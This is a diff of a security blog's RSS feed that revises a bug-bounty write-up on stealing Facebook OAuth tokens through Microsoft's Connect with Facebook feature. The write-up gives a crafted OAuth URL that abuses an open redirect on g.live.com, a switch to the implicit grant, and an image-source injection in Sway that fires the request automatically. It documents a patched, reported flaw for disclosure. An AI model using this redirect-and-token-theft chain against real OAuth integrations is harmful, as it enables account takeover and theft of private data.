@@ -6,28 +6,28 @@
     <atom:link href="https://r0rshark.github.io/feed.xml" rel="self" type="application/rss+xml" />
     <description></description>
     <language>en-us</language>
-    <pubDate>Tue, 08 Sep 2015 13:11:54 +0000</pubDate>
-    <lastBuildDate>Tue, 08 Sep 2015 13:11:54 +0000</lastBuildDate>
+    <pubDate>Tue, 15 Sep 2015 17:00:39 +0000</pubDate>
+    <lastBuildDate>Tue, 15 Sep 2015 17:00:39 +0000</lastBuildDate>
 
     
     
     <item>
-      <title>Stealing OAuth tokens in Microsoft Sway application</title>
-      <link>https://r0rshark.github.io/2015/09/06/microsoft/</link>
-      <pubDate>Sun, 06 Sep 2015 00:00:00 +0000</pubDate>
+      <title>Stealing OAuth tokens in Microsoft Web applications</title>
+      <link>https://r0rshark.github.io/2015/09/15/microsoft/</link>
+      <pubDate>Tue, 15 Sep 2015 00:00:00 +0000</pubDate>
       <author></author>
-      <guid>https://r0rshark.github.io/2015/09/06/microsoft</guid>
+      <guid>https://r0rshark.github.io/2015/09/15/microsoft</guid>
       <description>&lt;h3 id=&quot;tldr&quot;&gt;TL;DR&lt;/h3&gt;
-&lt;p&gt;The Connect with Facebook functionality of Microsoft is vulnerable to the OAuth token stealing attack.
+&lt;p&gt;The Connect with Facebook functionality of Microsoft is vulnerable to the OAuth Covert Redirect attack.
 The &lt;code&gt;redirect_uri&lt;/code&gt; parameter can be modified by the attacker making the Facebook OAuth token leak to a domain not controlled by Microsoft and in this way steal user private information accessible through the token.&lt;/p&gt;
 
 &lt;h3 id=&quot;oauth-guide&quot;&gt;OAUTH GUIDE&lt;/h3&gt;
 
-&lt;p&gt;A basic undestanding of the OAuth flow is useful to better understand this post, a very good guide can be found &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2&quot;&gt;here&lt;/a&gt;. When reading the guide focus the attention on “Grant Type: Authorization Code” and the “Grant Type: Implicit” which are by far the most common approaches.&lt;/p&gt;
+&lt;p&gt;A basic undestanding of the OAuth flow is useful to better understand this post, a very good guide can be found &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2&quot;&gt;here&lt;/a&gt;. When reading the guide focus the attention on &lt;em&gt;“Grant Type: Authorization Code”&lt;/em&gt; and the &lt;em&gt;“Grant Type: Implicit”&lt;/em&gt; which are by far the most common approaches.&lt;/p&gt;
 
 &lt;h3 id=&quot;probing-for-wide-redirecturi&quot;&gt;PROBING FOR WIDE REDIRECT_URI&lt;/h3&gt;
-&lt;p&gt;The &lt;code&gt;redirect_uri&lt;/code&gt; parameter is very important because it represents the url to which the authorization_code/access_token (based on Grant Type) is sent. If we are able to change the value of the &lt;code&gt;redirect_uri&lt;/code&gt; and not to make the OAuth flow to fail (because of authenticity checks on the &lt;code&gt;redirect_uri&lt;/code&gt;) we could leak the token/code to a domain controlled by us.
-Original request:&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;redirect_uri&lt;/code&gt; parameter is very important because it represents the url to which the &lt;strong&gt;authorization_code/access_token&lt;/strong&gt; (based on Grant Type) is sent. If we are able to change the value of the &lt;code&gt;redirect_uri&lt;/code&gt; and not to make the OAuth flow to fail (because of authenticity checks on the &lt;code&gt;redirect_uri&lt;/code&gt;) we could leak the token/code to a domain controlled by us.
+Original Oauth request:&lt;/p&gt;
 
 &lt;p&gt;&lt;code&gt;https://www.facebook.com/v2.0/dialog/oauth?client_id=441348565910475&lt;/code&gt;&lt;br /&gt;
 &lt;code&gt;&amp;amp;redirect_uri=&lt;/code&gt;&lt;strong&gt;https://profile.live.com/cid-847183e5db31faa2/services&lt;/strong&gt;&lt;br /&gt;
@@ -48,10 +48,10 @@ Original request:&lt;/p&gt;
 &lt;code&gt;&amp;amp;scope=user_photos&lt;/code&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;searching-for-open-redirect&quot;&gt;SEARCHING FOR OPEN REDIRECT&lt;/h3&gt;
-&lt;p&gt;The ability to leak the the token/code to a different subdomain/folder is not useful per se, however it will provide to the attacker &lt;strong&gt;a wider attack surface&lt;/strong&gt; to find an Open Redirect. An Open Redirect endpoint is a url which redirects the user to a parameter value without any validation. The idea is to &lt;strong&gt;find an Open Redirect in *.live.com/*&lt;/strong&gt; which would leak the token to a domain that we can control.&lt;/p&gt;
+&lt;p&gt;The ability to leak the the token/code to a different subdomain/folder is not useful per se, however it provides to the attacker &lt;strong&gt;a wider attack surface&lt;/strong&gt; to find an Open Redirect vulnerability. An Open Redirect endpoint is a url which redirects the user to a parameter value without any validation. The idea is to &lt;strong&gt;find an Open Redirect in *.live.com/*&lt;/strong&gt; which would leak the token to a domain that we can control.&lt;/p&gt;
 
 &lt;p&gt;After some google dorking I have noticed that the endpoint:
-  &lt;code&gt;g.live.com/0HE_TRACKSTAR_ENUS9/\&amp;lt;number\&amp;gt;&lt;/code&gt; issues a 302 Redirect to external domains based on  &lt;code&gt;\&amp;lt;number\&amp;gt;&lt;/code&gt;.&lt;br /&gt;
+  &lt;code&gt;g.live.com/0HE_TRACKSTAR_ENUS9/&amp;lt;number&amp;gt;&lt;/code&gt; issues a 302 Redirect to external domains based on  &lt;code&gt;&amp;lt;number&amp;gt;&lt;/code&gt;.&lt;br /&gt;
 For example &lt;code&gt;g.live.com/0HE_TRACKSTAR_ENUS9/1&lt;/code&gt;&lt;br /&gt;
 redirects to &lt;code&gt;http://www.msn.com/it-it/&lt;/code&gt;&lt;br /&gt;
 Through a 30 line of ruby script I have enumerated the possible domains to which I could leak the token&lt;/p&gt;
@@ -90,12 +90,12 @@ Through a 30 line of ruby script I have enumerated the possible domains to which
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;Among these domains there are some which can be purchased like g.live.com/0HE_TRACKSTAR_CSCZ9/75011 which redirects to http://staysafe.org/.
+&lt;p&gt;Among these domains there are some which can be purchased like  g.live.com/0HE_TRACKSTAR_CSCZ9/75011  which redirects to  http://staysafe.org/ .
 Making the  user issue a GET request to &lt;code&gt;https://www.facebook.com/v2.0/dialog/oauth?redirect_uri=http://g.live.com/0HE_TRACKSTAR_CSCZ9/75011&amp;amp;display=popup&lt;/code&gt;&lt;br /&gt;
-&lt;code&gt;&amp;amp;scope=user_photos+user_videos&amp;amp;client_id=441348565910475&amp;amp;ret=login&lt;/code&gt; will leak the token/code to http://staysafe.org/.&lt;/p&gt;
+&lt;code&gt;&amp;amp;scope=user_photos+user_videos&amp;amp;client_id=441348565910475&amp;amp;ret=login&lt;/code&gt; will leak the token/code to  &lt;em&gt;http://staysafe.org/&lt;/em&gt;.&lt;/p&gt;
 
 &lt;h3 id=&quot;changing-the-flow&quot;&gt;CHANGING THE FLOW&lt;/h3&gt;
-&lt;p&gt;Referencing to the guide that I have pointed out before the &lt;code&gt;Grant Type&lt;/code&gt; used by Microsoft is the &lt;code&gt;Authorization Code&lt;/code&gt; one. Using the exploit we can leak the &lt;code&gt;Authorization Code&lt;/code&gt; but in order to access the protected information we need to exchange the &lt;code&gt;Authorization code&lt;/code&gt; with the &lt;code&gt;Access Token&lt;/code&gt;. However in order to do this we need to know the &lt;code&gt;client secret&lt;/code&gt; which we aren’t able to get since it is stored on the Microsoft servers. In order to bypass this limitation we can change &lt;code&gt;Grant Type&lt;/code&gt; to the Implicit one which directly provides the &lt;code&gt;Access Token&lt;/code&gt; to the url in the redirect_url field.
+&lt;p&gt;Referencing to the guide that I have pointed out before the &lt;code&gt;Grant Type&lt;/code&gt; used by Microsoft is the &lt;code&gt;Authorization Code&lt;/code&gt; one. Using the exploit we can leak the &lt;code&gt;Authorization Code&lt;/code&gt; but in order to access the protected information we need to exchange the &lt;code&gt;Authorization code&lt;/code&gt; with the &lt;code&gt;Access Token&lt;/code&gt;. However in order achieve this we need to know the &lt;code&gt;client_secret&lt;/code&gt; which we aren’t able to get since it is stored on the Microsoft servers. In order to bypass this limitation we can change &lt;code&gt;Grant Type&lt;/code&gt; to the &lt;code&gt;Implicit&lt;/code&gt; one which directly provides the &lt;code&gt;Access Token&lt;/code&gt; to the url in the redirect_url field.
 With the Facebook SDK this can be done by &lt;strong&gt;adding the parameter response_type=token&lt;/strong&gt;.&lt;/p&gt;
 
 &lt;h3 id=&quot;stealing-the-token&quot;&gt;STEALING THE TOKEN&lt;/h3&gt;
@@ -109,8 +109,8 @@ With the Facebook SDK this can be done by &lt;strong&gt;adding the parameter res
 &lt;/ol&gt;
 
 &lt;h3 id=&quot;trigger-the-exploit-without-interaction&quot;&gt;TRIGGER THE EXPLOIT WITHOUT INTERACTION&lt;/h3&gt;
-&lt;p&gt;The Connect with Facebook functionality can be used in the Microsoft Sway application where I found a second vulnerability which would allow an attaker to make the user issue arbitrary GET requests by just viewing a “sway”.
-This is possible because, crafting a particular request in the Add image functionality, an attacker is able to persistently control the src attribute of an img tag. I tried to exploit this kind of vulnerability to get an XSS however the quotes were escaped and the &lt;code&gt;javascript:alert(1)&lt;/code&gt; payload in the img src attribute doesn’t work in the modern browsers. However we can use this vulnerability to automatically make the user issue our “exploit GET request” triggering our exploit as soon as he view a maliciously crafted “sway”.&lt;/p&gt;
+&lt;p&gt;The Connect with Facebook functionality can be used in the &lt;code&gt;Microsoft Sway application&lt;/code&gt; where I found a second vulnerability which would allow an attaker to make the user issue arbitrary GET requests by just viewing a &lt;code&gt;&quot;sway&quot;&lt;/code&gt;.
+This is possible because, crafting a particular request in the Add image functionality, an attacker is able to persistently control the &lt;code&gt;src attribute of an img tag&lt;/code&gt;. I tried to exploit this kind of vulnerability to get an XSS however the quotes were escaped and the &lt;code&gt;javascript:alert(1)&lt;/code&gt; payload in the img src attribute doesn’t work in the modern browsers. However we can use this vulnerability to automatically make the user issue our “exploit GET request” triggering our exploit as soon as he view a maliciously crafted &lt;code&gt;&quot;sway&quot;&lt;/code&gt;.&lt;/p&gt;
 
 &lt;div class=&quot;full zoomable&quot;&gt;
   &lt;img src=&quot;/images/microsoft/sway_poc.png&quot; /&gt;
@@ -119,7 +119,7 @@ This is possible because, crafting a particular request in the Add image functio
 &lt;ul&gt;
   &lt;li&gt;15 May 2015 Vulnerability reported to the Microsoft Security Team&lt;/li&gt;
   &lt;li&gt;4 August 2015 Vulnerability patched&lt;/li&gt;
-  &lt;li&gt;25 August 2015 Got reward of $1000&lt;/li&gt;
+  &lt;li&gt;25 August 2015 Got reward of 1000$&lt;/li&gt;
 &lt;/ul&gt;
 
 </description>
